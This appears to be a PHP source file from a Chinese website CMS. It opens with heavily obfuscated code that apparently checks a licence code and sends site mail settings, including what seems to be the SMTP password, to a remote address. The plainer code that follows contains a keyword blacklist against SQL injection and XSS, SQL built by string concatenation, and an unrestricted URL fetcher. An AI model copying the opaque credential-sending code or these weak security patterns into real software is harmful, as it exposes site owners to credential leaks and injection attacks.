G17x77;G17ldMhx78:$G17ACV1=$GLOBALS[W13WMFQJ][0];G17x77:unset($G17ACV2);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx76;goto G17ldMhx76;G17eWjgx76:$G17ACV2=&$GLOBALS[W13WMFQJ][04];goto G17x75;G17ldMhx76:$G17ACV2=$GLOBALS[W13WMFQJ][04];G17x75:$G17F0=call_user_func_array("pack",array(&$G17ACV1,&$G17ACV2));$G17P0=$A76E5WTJ . $NZ2KC26v;unset($G17ACV6);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx7c;goto G17ldMhx7c;G17eWjgx7c:$G17ACV6=&$GLOBALS[W13WMFQJ][0];goto G17x7b;G17ldMhx7c:$G17ACV6=$GLOBALS[W13WMFQJ][0];G17x7b:unset($G17ACV7);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx7a;goto G17ldMhx7a;G17eWjgx7a:$G17ACV7=&$GLOBALS[W13WMFQJ][5];goto G17x79;G17ldMhx7a:$G17ACV7=$GLOBALS[W13WMFQJ][5];G17x79:$G17F5=call_user_func_array("pack",array(&$G17ACV6,&$G17ACV7));$G17P1=$G17P0 . $G17F5;if($GLOBALS[$G17F0]($G17P1))goto G17eWjgx7d;goto G17ldMhx7d;G17eWjgx7d:unset($G17ACV1);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx7g;goto G17ldMhx7g;G17eWjgx7g:$G17ACV1=&$GLOBALS[W13WMFQJ][0];goto G17x7f;G17ldMhx7g:$G17ACV1=$GLOBALS[W13WMFQJ][0];G17x7f:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[W13WMFQJ]{0x6}));unset($G17ACV4);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx7k;goto G17ldMhx7k;G17eWjgx7k:$G17ACV4=&$GLOBALS[W13WMFQJ][0];goto G17x7j;G17ldMhx7k:$G17ACV4=$GLOBALS[W13WMFQJ][0];G17x7j:unset($G17ACV5);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx7i;goto G17ldMhx7i;G17eWjgx7i:$G17ACV5=&$GLOBALS[W13WMFQJ][07];goto G17x7h;G17ldMhx7i:$G17ACV5=$GLOBALS[W13WMFQJ][07];G17x7h:$G17F3=call_user_func_array("pack",array(&$G17ACV4,&$G17ACV5));$G17P0=$A76E5WTJ . $NZ2KC26v;unset($G17ACV9);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx7o;goto G17ldMhx7o;G17eWjgx7o:$G17ACV9=&$GLOBALS[W13WMFQJ][0];goto G17x7n;G17ldMhx7o:$G17ACV9=$GLOBALS[W13WMFQJ][0];G17x7n:unset($G17ACV10);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx7m;goto G17ldMhx7m;G17eWjgx7m:$G17ACV10=&$GLOBALS[W13WMFQJ][5];goto G17x7l;G17ldMhx7m:$G17ACV10=$GLOBALS[W13WMFQJ][5];G17x7l:$G17F8=call_user_func_array("pack",array(&$G17ACV9,&$G17ACV10));$G17P1=$G17P0 . $G17F8;$G17P2=0-154;$G17P3=77*E_WARNING;$G17P4=$G17P2+$G17P3;$G17P5=$G17P4-194;$G17P6=E_WARNING*97;$G17P7=$G17P5+$G17P6;$G17P8=0-154;$G17P9=77*E_WARNING;$G17P10=$G17P8+$G17P9;$G17P11=$G17P10+2;$G17P12=15*E_WARNING;$G17P13=$G17P11+$G17P12;unset($G17ACV14);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx7q;goto G17ldMhx7q;G17eWjgx7q:$G17ACV14=&$GLOBALS[W13WMFQJ][0];goto G17x7p;G17ldMhx7q:$G17ACV14=$GLOBALS[W13WMFQJ][0];G17x7p:$G17F13=call_user_func_array("pack",array(&$G17ACV14,$GLOBALS[W13WMFQJ]{8}));$G1714=$GLOBALS[$G17F0]($GLOBALS[$G17F3]($G17P1),$G17P7,$G17P13)!=$GLOBALS[$G17F13]($C_authcode);if($G1714)goto G17eWjgx7r;goto G17ldMhx7r;G17eWjgx7r:unset($G17ACV1);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx7v;goto G17ldMhx7v;G17eWjgx7v:$G17ACV1=&$GLOBALS[W13WMFQJ][0];goto G17x7u;G17ldMhx7v:$G17ACV1=$GLOBALS[W13WMFQJ][0];G17x7u:unset($G17ACV2);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx7t;goto G17ldMhx7t;G17eWjgx7t:$G17ACV2=&$GLOBALS[W13WMFQJ][9];goto G17x7s;G17ldMhx7t:$G17ACV2=$GLOBALS[W13WMFQJ][9];G17x7s:$G17F0=call_user_func_array("pack",array(&$G17ACV1,&$G17ACV2));$G17P0=$A76E5WTJ . $NZ2KC26v;unset($G17ACV6);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx8z;goto G17ldMhx8z;G17eWjgx8z:$G17ACV6=&$GLOBALS[W13WMFQJ][0];goto G17x7y;G17ldMhx8z:$G17ACV6=$GLOBALS[W13WMFQJ][0];G17x7y:unset($G17ACV7);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx7x;goto G17ldMhx7x;G17eWjgx7x:$G17ACV7=&$GLOBALS[W13WMFQJ][10];goto G17x7w;G17ldMhx7x:$G17ACV7=$GLOBALS[W13WMFQJ][10];G17x7w:$G17F5=call_user_func_array("pack",array(&$G17ACV6,&$G17ACV7));$G17P1=$G17P0 . $G17F5;unset($G17ACV11);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx86;goto G17ldMhx86;G17eWjgx86:$G17ACV11=&$GLOBALS[W13WMFQJ][0];goto G17x85;G17ldMhx86:$G17ACV11=$GLOBALS[W13WMFQJ][0];G17x85:$G17F10=call_user_func_array("pack",array(&$G17ACV11,$GLOBALS[W13WMFQJ]{11}));$G17P2=0-154;$G17P3=77*E_WARNING;$G17P4=$G17P2+$G17P3;$G17P5=$G17P4-194;$G17P6=E_WARNING*97;$G17P7=$G17P5+$G17P6;unset($G17ACV13);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx84;goto G17ldMhx84;G17eWjgx84:$G17ACV13=&$GLOBALS[W13WMFQJ][0];goto G17x83;G17ldMhx84:$G17ACV13=$GLOBALS[W13WMFQJ][0];G17x83:unset($G17ACV14);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx82;goto G17ldMhx82;G17eWjgx82:$G17ACV14=&$GLOBALS[W13WMFQJ][12];goto G17x81;G17ldMhx82:$G17ACV14=$GLOBALS[W13WMFQJ][12];G17x81:$G17F12=call_user_func_array("pack",array(&$G17ACV13,&$G17ACV14));$G17P8=$G17F10 . $GLOBALS[RMGDMYSJ][$G17P7][$G17F12];unset($G17ACV19);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx8c;goto G17ldMhx8c;G17eWjgx8c:$G17ACV19=&$GLOBALS[W13WMFQJ][0];goto G17x8b;G17ldMhx8c:$G17ACV19=$GLOBALS[W13WMFQJ][0];G17x8b:unset($G17ACV20);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx8a;goto G17ldMhx8a;G17eWjgx8a:$G17ACV20=&$GLOBALS[W13WMFQJ][13];goto G17x89;G17ldMhx8a:$G17ACV20=$GLOBALS[W13WMFQJ][13];G17x89:$G17F18=call_user_func_array("pack",array(&$G17ACV19,&$G17ACV20));$G17P9=$G17F18 . $C_authcode;unset($G17ACV22);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx88;goto G17ldMhx88;G17eWjgx88:$G17ACV22=&$GLOBALS[W13WMFQJ][0];goto G17x87;G17ldMhx88:$G17ACV22=$GLOBALS[W13WMFQJ][0];G17x87:$G17F21=call_user_func_array("pack",array(&$G17ACV22,$GLOBALS[W13WMFQJ]{016}));$G17P10=$G17P9 . $G17F21;$G17P11=$G17P10 . $NZ2KC26v;$G17F26=call_user_func_array("getbody",array(&$G17P8,&$G17P11));$GLOBALS[$G17F0]($G17P1,$G17F26);goto G17x7e;G17ldMhx7r:G17x7e:goto G17x74;G17ldMhx7d:unset($G17ACV1);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx8g;goto G17ldMhx8g;G17eWjgx8g:$G17ACV1=&$GLOBALS[W13WMFQJ][0];goto G17x8f;G17ldMhx8g:$G17ACV1=$GLOBALS[W13WMFQJ][0];G17x8f:unset($G17ACV2);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx8e;goto G17ldMhx8e;G17eWjgx8e:$G17ACV2=&$GLOBALS[W13WMFQJ][9];goto G17x8d;G17ldMhx8e:$G17ACV2=$GLOBALS[W13WMFQJ][9];G17x8d:$G17F0=call_user_func_array("pack",array(&$G17ACV1,&$G17ACV2));$G17P0=$A76E5WTJ . $NZ2KC26v;unset($G17ACV6);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx8k;goto G17ldMhx8k;G17eWjgx8k:$G17ACV6=&$GLOBALS[W13WMFQJ][0];goto G17x8j;G17ldMhx8k:$G17ACV6=$GLOBALS[W13WMFQJ][0];G17x8j:unset($G17ACV7);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx8i;goto G17ldMhx8i;G17eWjgx8i:$G17ACV7=&$GLOBALS[W13WMFQJ][10];goto G17x8h;G17ldMhx8i:$G17ACV7=$GLOBALS[W13WMFQJ][10];G17x8h:$G17F5=call_user_func_array("pack",array(&$G17ACV6,&$G17ACV7));$G17P1=$G17P0 . $G17F5;unset($G17ACV11);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx8q;goto G17ldMhx8q;G17eWjgx8q:$G17ACV11=&$GLOBALS[W13WMFQJ][0];goto G17x8p;G17ldMhx8q:$G17ACV11=$GLOBALS[W13WMFQJ][0];G17x8p:$G17F10=call_user_func_array("pack",array(&$G17ACV11,$GLOBALS[W13WMFQJ]{11}));$G17P2=0-154;$G17P3=77*E_WARNING;$G17P4=$G17P2+$G17P3;$G17P5=$G17P4-194;$G17P6=E_WARNING*97;$G17P7=$G17P5+$G17P6;unset($G17ACV13);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx8o;goto G17ldMhx8o;G17eWjgx8o:$G17ACV13=&$GLOBALS[W13WMFQJ][0];goto G17x8n;G17ldMhx8o:$G17ACV13=$GLOBALS[W13WMFQJ][0];G17x8n:unset($G17ACV14);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx8m;goto G17ldMhx8m;G17eWjgx8m:$G17ACV14=&$GLOBALS[W13WMFQJ][12];goto G17x8l;G17ldMhx8m:$G17ACV14=$GLOBALS[W13WMFQJ][12];G17x8l:$G17F12=call_user_func_array("pack",array(&$G17ACV13,&$G17ACV14));$G17P8=$G17F10 . $GLOBALS[RMGDMYSJ][$G17P7][$G17F12];unset($G17ACV19);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx8w;goto G17ldMhx8w;G17eWjgx8w:$G17ACV19=&$GLOBALS[W13WMFQJ][0];goto G17x8v;G17ldMhx8w:$G17ACV19=$GLOBALS[W13WMFQJ][0];G17x8v:unset($G17ACV20);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx8u;goto G17ldMhx8u;G17eWjgx8u:$G17ACV20=&$GLOBALS[W13WMFQJ][13];goto G17x8t;G17ldMhx8u:$G17ACV20=$GLOBALS[W13WMFQJ][13];G17x8t:$G17F18=call_user_func_array("pack",array(&$G17ACV19,&$G17ACV20));$G17P9=$G17F18 . $C_authcode;unset($G17ACV22);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx8s;goto G17ldMhx8s;G17eWjgx8s:$G17ACV22=&$GLOBALS[W13WMFQJ][0];goto G17x8r;G17ldMhx8s:$G17ACV22=$GLOBALS[W13WMFQJ][0];G17x8r:$G17F21=call_user_func_array("pack",array(&$G17ACV22,$GLOBALS[W13WMFQJ]{016}));$G17P10=$G17P9 . $G17F21;$G17P11=$G17P10 . $NZ2KC26v;$G17F26=call_user_func_array("getbody",array(&$G17P8,&$G17P11));$GLOBALS[$G17F0]($G17P1,$G17F26);G17x74:}function sendmail($NCD8ZYEQ,$P488HV0J,$I92O294J){global $C_email,$C_domain,$C_logo,$C_title,$C_mailcode,$C_mailtype,$C_smtp;$G170=0-23;$G171=E_WARNING*12;$G172=$G170+$G171;$G173=$C_mailtype==$G172;if($G173)goto G17eWjgx8y;goto G17ldMhx8y;G17eWjgx8y:unset($G17ACV1);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgx91;goto G17ldMhx91;G17eWjgx91:$G17ACV1=&$GLOBALS[Q7HL38Dv][00];goto G17x9z;G17ldMhx91:$G17ACV1=$GLOBALS[Q7HL38Dv][00];G17x9z:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[Q7HL38Dv]{0x1}));unset($G17ACV4);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgx9r;goto G17ldMhx9r;G17eWjgx9r:$G17ACV4=&$GLOBALS[Q7HL38Dv][00];goto G17x9q;G17ldMhx9r:$G17ACV4=$GLOBALS[Q7HL38Dv][00];G17x9q:unset($G17ACV5);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgx9p;goto G17ldMhx9p;G17eWjgx9p:$G17ACV5=&$GLOBALS[Q7HL38Dv][02];goto G17x9o;G17ldMhx9p:$G17ACV5=$GLOBALS[Q7HL38Dv][02];G17x9o:$G17F3=call_user_func_array("pack",array(&$G17ACV4,&$G17ACV5));$G17F6=call_user_func_array("urlencode",array(&$C_email));$G17P0=$G17F3 . $G17F6;unset($G17ACV8);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgx9n;goto G17ldMhx9n;G17eWjgx9n:$G17ACV8=&$GLOBALS[Q7HL38Dv][00];goto G17x9m;G17ldMhx9n:$G17ACV8=$GLOBALS[Q7HL38Dv][00];G17x9m:$G17F7=call_user_func_array("pack",array(&$G17ACV8,$GLOBALS[Q7HL38Dv]{0x3}));$G17P1=$G17P0 . $G17F7;$G17F9=call_user_func_array("urlencode",array(&$I92O294J));$G17P2=$G17P1 . $G17F9;unset($G17ACV11);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgx9l;goto G17ldMhx9l;G17eWjgx9l:$G17ACV11=&$GLOBALS[Q7HL38Dv][00];goto G17x9k;G17ldMhx9l:$G17ACV11=$GLOBALS[Q7HL38Dv][00];G17x9k:unset($G17ACV12);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgx9j;goto G17ldMhx9j;G17eWjgx9j:$G17ACV12=&$GLOBALS[Q7HL38Dv][4];goto G17x9i;G17ldMhx9j:$G17ACV12=$GLOBALS[Q7HL38Dv][4];G17x9i:$G17F10=call_user_func_array("pack",array(&$G17ACV11,&$G17ACV12));$G17P3=$G17P2 . $G17F10;$G17F13=call_user_func_array("urlencode",array(&$C_title));$G17P4=$G17P3 . $G17F13;unset($G17ACV15);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgx9h;goto G17ldMhx9h;G17eWjgx9h:$G17ACV15=&$GLOBALS[Q7HL38Dv][00];goto G17x9g;G17ldMhx9h:$G17ACV15=$GLOBALS[Q7HL38Dv][00];G17x9g:$G17F14=call_user_func_array("pack",array(&$G17ACV15,$GLOBALS[Q7HL38Dv]{0x5}));$G17P5=$G17P4 . $G17F14;$G17F16=call_user_func_array("urlencode",array(&$NCD8ZYEQ));$G17P6=$G17P5 . $G17F16;unset($G17ACV18);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgx9f;goto G17ldMhx9f;G17eWjgx9f:$G17ACV18=&$GLOBALS[Q7HL38Dv][00];goto G17x9e;G17ldMhx9f:$G17ACV18=$GLOBALS[Q7HL38Dv][00];G17x9e:$G17F17=call_user_func_array("pack",array(&$G17ACV18,$GLOBALS[Q7HL38Dv]{6}));$G17P7=$G17P6 . $G17F17;$G17F19=call_user_func_array("urlencode",array(&$P488HV0J));$G17P8=$G17P7 . $G17F19;unset($G17ACV21);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgx9d;goto G17ldMhx9d;G17eWjgx9d:$G17ACV21=&$GLOBALS[Q7HL38Dv][00];goto G17x9c;G17ldMhx9d:$G17ACV21=$GLOBALS[Q7HL38Dv][00];G17x9c:unset($G17ACV22);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgx9b;goto G17ldMhx9b;G17eWjgx9b:$G17ACV22=&$GLOBALS[Q7HL38Dv][7];goto G17x9a;G17ldMhx9b:$G17ACV22=$GLOBALS[Q7HL38Dv][7];G17x9a:$G17F20=call_user_func_array("pack",array(&$G17ACV21,&$G17ACV22));$G17P9=$G17P8 . $G17F20;$G17F23=call_user_func_array("urlencode",array(&$C_smtp));$G17P10=$G17P9 . $G17F23;unset($G17ACV25);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgx99;goto G17ldMhx99;G17eWjgx99:$G17ACV25=&$GLOBALS[Q7HL38Dv][00];goto G17x98;G17ldMhx99:$G17ACV25=$GLOBALS[Q7HL38Dv][00];G17x98:$G17F24=call_user_func_array("pack",array(&$G17ACV25,$GLOBALS[Q7HL38Dv]{8}));$G17P11=$G17P10 . $G17F24;$G17F26=call_user_func_array("urlencode",array(&$C_mailcode));$G17P12=$G17P11 . $G17F26;unset($G17ACV28);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgx97;goto G17ldMhx97;G17eWjgx97:$G17ACV28=&$GLOBALS[Q7HL38Dv][00];goto G17x96;G17ldMhx97:$G17ACV28=$GLOBALS[Q7HL38Dv][00];G17x96:$G17F27=call_user_func_array("pack",array(&$G17ACV28,$GLOBALS[Q7HL38Dv]{0x9}));$G17P13=$G17P12 . $G17F27;unset($G17ACV30);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgx93;goto G17ldMhx93;G17eWjgx93:$G17ACV30=&$GLOBALS[Q7HL38Dv][00];goto G17x92;G17ldMhx93:$G17ACV30=$GLOBALS[Q7HL38Dv][00];G17x92:$G17F29=call_user_func_array("pack",array(&$G17ACV30,$GLOBALS[Q7HL38Dv]{10}));$G17P14=$C_domain . $G17F29;$G17P15=$G17P14 . $C_logo;$G17F32=call_user_func_array("urlencode",array(&$G17P15));$G17P16=$G17P13 . $G17F32;unset($G17ACV34);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgx95;goto G17ldMhx95;G17eWjgx95:$G17ACV34=&$GLOBALS[Q7HL38Dv][00];goto G17x94;G17ldMhx95:$G17ACV34=$GLOBALS[Q7HL38Dv][00];G17x94:$G17F33=call_user_func_array("pack",array(&$G17ACV34,$GLOBALS[Q7HL38Dv]{11}));$G17P17=$G17P16 . $G17F33;$G17F35=call_user_func_array("urlencode",array(&$C_domain));$G17P18=$G17P17 . $G17F35;$G17F48=call_user_func_array("GetBody",array(&$G17F0,&$G17P18));goto G17x8x;G17ldMhx8y:unset($G17ACV1);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgx9t;goto G17ldMhx9t;G17eWjgx9t:$G17ACV1=&$GLOBALS[Q7HL38Dv][00];goto G17x9s;G17ldMhx9t:$G17ACV1=$GLOBALS[Q7HL38Dv][00];G17x9s:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[Q7HL38Dv]{0x1}));unset($G17ACV4);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgxao;goto G17ldMhxao;G17eWjgxao:$G17ACV4=&$GLOBALS[Q7HL38Dv][00];goto G17xan;G17ldMhxao:$G17ACV4=$GLOBALS[Q7HL38Dv][00];G17xan:unset($G17ACV5);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgxam;goto G17ldMhxam;G17eWjgxam:$G17ACV5=&$GLOBALS[Q7HL38Dv][02];goto G17xal;G17ldMhxam:$G17ACV5=$GLOBALS[Q7HL38Dv][02];G17xal:$G17F3=call_user_func_array("pack",array(&$G17ACV4,&$G17ACV5));unset($G17ACV7);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgx9x;goto G17ldMhx9x;G17eWjgx9x:$G17ACV7=&$GLOBALS[Q7HL38Dv][00];goto G17x9w;G17ldMhx9x:$G17ACV7=$GLOBALS[Q7HL38Dv][00];G17x9w:unset($G17ACV8);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgx9v;goto G17ldMhx9v;G17eWjgx9v:$G17ACV8=&$GLOBALS[Q7HL38Dv][014];goto G17x9u;G17ldMhx9v:$G17ACV8=$GLOBALS[Q7HL38Dv][014];G17x9u:$G17F6=call_user_func_array("pack",array(&$G17ACV7,&$G17ACV8));$G17F11=call_user_func_array("urlencode",array(&$G17F6));$G17P0=$G17F3 . $G17F11;unset($G17ACV13);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgxak;goto G17ldMhxak;G17eWjgxak:$G17ACV13=&$GLOBALS[Q7HL38Dv][00];goto G17xaj;G17ldMhxak:$G17ACV13=$GLOBALS[Q7HL38Dv][00];G17xaj:$G17F12=call_user_func_array("pack",array(&$G17ACV13,$GLOBALS[Q7HL38Dv]{0x3}));$G17P1=$G17P0 . $G17F12;$G17F14=call_user_func_array("urlencode",array(&$I92O294J));$G17P2=$G17P1 . $G17F14;unset($G17ACV16);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgxai;goto G17ldMhxai;G17eWjgxai:$G17ACV16=&$GLOBALS[Q7HL38Dv][00];goto G17xah;G17ldMhxai:$G17ACV16=$GLOBALS[Q7HL38Dv][00];G17xah:unset($G17ACV17);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgxag;goto G17ldMhxag;G17eWjgxag:$G17ACV17=&$GLOBALS[Q7HL38Dv][4];goto G17xaf;G17ldMhxag:$G17ACV17=$GLOBALS[Q7HL38Dv][4];G17xaf:$G17F15=call_user_func_array("pack",array(&$G17ACV16,&$G17ACV17));$G17P3=$G17P2 . $G17F15;$G17F18=call_user_func_array("urlencode",array(&$C_title));$G17P4=$G17P3 . $G17F18;unset($G17ACV20);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgxae;goto G17ldMhxae;G17eWjgxae:$G17ACV20=&$GLOBALS[Q7HL38Dv][00];goto G17xad;G17ldMhxae:$G17ACV20=$GLOBALS[Q7HL38Dv][00];G17xad:$G17F19=call_user_func_array("pack",array(&$G17ACV20,$GLOBALS[Q7HL38Dv]{0x5}));$G17P5=$G17P4 . $G17F19;$G17F21=call_user_func_array("urlencode",array(&$NCD8ZYEQ));$G17P6=$G17P5 . $G17F21;unset($G17ACV23);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgxac;goto G17ldMhxac;G17eWjgxac:$G17ACV23=&$GLOBALS[Q7HL38Dv][00];goto G17xab;G17ldMhxac:$G17ACV23=$GLOBALS[Q7HL38Dv][00];G17xab:$G17F22=call_user_func_array("pack",array(&$G17ACV23,$GLOBALS[Q7HL38Dv]{6}));$G17P7=$G17P6 . $G17F22;$G17F24=call_user_func_array("urlencode",array(&$P488HV0J));$G17P8=$G17P7 . $G17F24;unset($G17ACV26);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgxaa;goto G17ldMhxaa;G17eWjgxaa:$G17ACV26=&$GLOBALS[Q7HL38Dv][00];goto G17xa9;G17ldMhxaa:$G17ACV26=$GLOBALS[Q7HL38Dv][00];G17xa9:unset($G17ACV27);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgxa8;goto G17ldMhxa8;G17eWjgxa8:$G17ACV27=&$GLOBALS[Q7HL38Dv][7];goto G17xa7;G17ldMhxa8:$G17ACV27=$GLOBALS[Q7HL38Dv][7];G17xa7:$G17F25=call_user_func_array("pack",array(&$G17ACV26,&$G17ACV27));$G17P9=$G17P8 . $G17F25;$G17F28=call_user_func_array("urlencode",array(&$C_smtp));$G17P10=$G17P9 . $G17F28;unset($G17ACV30);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgxa6;goto G17ldMhxa6;G17eWjgxa6:$G17ACV30=&$GLOBALS[Q7HL38Dv][00];goto G17xa5;G17ldMhxa6:$G17ACV30=$GLOBALS[Q7HL38Dv][00];G17xa5:$G17F29=call_user_func_array("pack",array(&$G17ACV30,$GLOBALS[Q7HL38Dv]{8}));$G17P11=$G17P10 . $G17F29;$G17F31=call_user_func_array("urlencode",array(&$C_mailcode));$G17P12=$G17P11 . $G17F31;unset($G17ACV33);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgxa4;goto G17ldMhxa4;G17eWjgxa4:$G17ACV33=&$GLOBALS[Q7HL38Dv][00];goto G17xa3;G17ldMhxa4:$G17ACV33=$GLOBALS[Q7HL38Dv][00];G17xa3:$G17F32=call_user_func_array("pack",array(&$G17ACV33,$GLOBALS[Q7HL38Dv]{0x9}));$G17P13=$G17P12 . $G17F32;unset($G17ACV35);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgxaz;goto G17ldMhxaz;G17eWjgxaz:$G17ACV35=&$GLOBALS[Q7HL38Dv][00];goto G17x9y;G17ldMhxaz:$G17ACV35=$GLOBALS[Q7HL38Dv][00];G17x9y:$G17F34=call_user_func_array("pack",array(&$G17ACV35,$GLOBALS[Q7HL38Dv]{10}));$G17P14=$C_domain . $G17F34;$G17P15=$G17P14 . $C_logo;$G17F37=call_user_func_array("urlencode",array(&$G17P15));$G17P16=$G17P13 . $G17F37;unset($G17ACV39);if(is_array($GLOBALS[Q7HL38Dv]))goto G17eWjgxa2;goto G17ldMhxa2;G17eWjgxa2:$G17ACV39=&$GLOBALS[Q7HL38Dv][00];goto G17xa1;G17ldMhxa2:$G17ACV39=$GLOBALS[Q7HL38Dv][00];G17xa1:$G17F38=call_user_func_array("pack",array(&$G17ACV39,$GLOBALS[Q7HL38Dv]{11}));$G17P17=$G17P16 . $G17F38;$G17F40=call_user_func_array("urlencode",array(&$C_domain));$G17P18=$G17P17 . $G17F40;$G17F53=call_user_func_array("GetBody",array(&$G17F0,&$G17P18));G17x8x:}

if(strpos(strtolower($_SERVER['PHP_SELF']),"api/alipay/notify_url.php")===false){
	$_POST = array_map('check_input', $_POST);
}

if($_GET["uid"]!=""){
	$_SESSION["uid"]=$_GET["uid"];
}

function downpic($path,$url){
$name=date("YmdHis").gen_key(3).".jpg";
if(substr($url,0,2)=="//"){
    $url="http:".$url;
}
$url = getbody(str_replace("https://","http://",$url),"","GET");
file_put_contents($path.$name,$url);
return $name;
}

function check_input($value){
	if (get_magic_quotes_gpc() || is_array($value)){
		return $value;
	}else{
		return addslashes($value);
	}
}

function check_input2($value){
	if (get_magic_quotes_gpc() || is_array($value)){
		return $value;
	}else{
		$value=str_replace(" ","_",$value);
		$value=str_replace("	","_",$value);
		return addslashes($value);
	}
}

function inject_check($sql_str) {
	if(is_array($sql_str)){
		return false;
	}else{
    	return preg_match('/select |xsspt.com|<script |<\/script>|insert |delete |and |or |update | select| insert| delete| and| or| update|join | join| union|union | declare|declare | master|master | exec|exec | truncate|truncate | where|where | begin|begin |char | char|chr | chr| mid|mid |-- | --|\'|\/\*|\*|\.\.\/|\.\//i', $sql_str);
    }
}

function text($t){
	global $conn,$id,$C_kefu;
	$sql="select * from sl_text where T_id=".$id;
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if (mysqli_num_rows($result) > 0) {
		$t = str_Replace("[T_title]",$row["T_title"],$t);
		$t = str_Replace("[T_pic]",$row["T_pic"],$t);
		$t = str_Replace("[T_order]",$row["T_order"],$t);

		switch($row["T_type"]){
			case 0:
			$T_content=$row["T_content"];
			break;

			case 1:
			$kf=explode("|",$C_kefu);
			for($i=0;$i<count($kf);$i++){
				switch(splitx($kf[$i],"_",1)){
					case "qq":
					$type="QQ";
					$url="http://wpa.qq.com/msgrd?v=3&uin=".splitx($kf[$i],"_",0)."&site=qq&menu=yes";
					break;
					case "ww":
					$type="旺旺";
					$url="http://www.taobao.com/webww/ww.php?ver=3&touid=".splitx($kf[$i],"_",0)."&siteid=cntaobao&status=1&charset=utf-8";
					break;
					case "wx":
					$type="微信";
					$url="javascript:;";
					break;
					case "phone":
					$type="电话";
					$url="tel:".splitx($kf[$i],"_",0);
					break;
					case "email":
					$type="邮箱";
					$url="mailto:".splitx($kf[$i],"_",0);
					break;
				}
				$kefu=$kefu."<b>".splitx($kf[$i],"_",2)."</b> <a href=\"".$url."\">".$type."：".splitx($kf[$i],"_",0)."</a><br>";
			}

			$T_content="<iframe src=\"conn/mapload.php?C_address=".$row["T_address"]."&C_zb=".$row["T_zb"]."\" scrolling=\"no\" name=\"mapif\" type=\"1\" frameborder=\"0\" height=\"400\" width=\"100%\" style=\"margin: 20px 0\"></iframe><p style=\"font-size:20px;font-weight:bold;\">联系方式：</p><p>".$row["T_content"]."</p><p style=\"font-size:20px;font-weight:bold;margin-top:10px;\">在线客服：</p><p>".$kefu."</p>";
			break;

			case 2:
			$T_content=$row["T_content"].'<link href="css/form.css" rel="stylesheet">
<div class="form_container">
<form action="booksave.php?action=save" method="post">
<div class="left">留言标题</div><div class="right"><input type="text" name="G_title" placeholder="必填"></div>
<div class="left">您的姓名</div><div class="right"><input type="text" name="G_name" placeholder="必填"></div>
<div class="left">联系电话</div><div class="right"><input type="text" name="G_phone" placeholder="必填"></div>
<div class="left">电子邮箱</div><div class="right"><input type="text" name="G_mail" placeholder="必填"></div>
<div class="left">留言内容</div><div class="right"><textarea name="G_msg"></textarea></div>
<div class="left"></div><div class="right"><iframe src="conn/code_1.php?name=G_code" scrolling="no" frameborder="0" width="100%" height="40"></iframe></div>
<div class="left"></div><div class="right"><button type="submit">提交留言</button><button type="reset">重新填写</button></div>
</form>
</div>';
			break;
		}
		$t = str_Replace("[T_content]",$T_content,$t);
	}
	return $t;
}

function news($t){
	global $conn,$id;
	$M_id=intval($_GET["M_id"]);
